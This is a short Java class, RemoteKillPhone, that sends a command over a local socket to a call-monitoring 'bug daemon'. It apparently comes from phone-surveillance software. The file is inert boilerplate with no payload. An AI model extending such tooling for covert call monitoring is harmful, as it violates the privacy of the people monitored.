package com.vvt.callmanager.ref.command;

import com.fx.socket.SocketCmd;
import com.vvt.callmanager.ref.BugDaemonResource;

public class RemoteKillPhone extends SocketCmd<String, Boolean> {
	
	private static final long serialVersionUID = 2598541042117820367L;
	
	private static final String TAG = "RemoteKillPhone";
	private static final String SERVER_NAME = BugDaemonResource.CallMon.SOCKET_NAME;

	public RemoteKillPhone() {
		super(null, Boolean.class);
	}

	@Override
	protected String getTag() {
		return TAG;
	}

	@Override
	protected String getServerName() {
		return SERVER_NAME;
	}

}
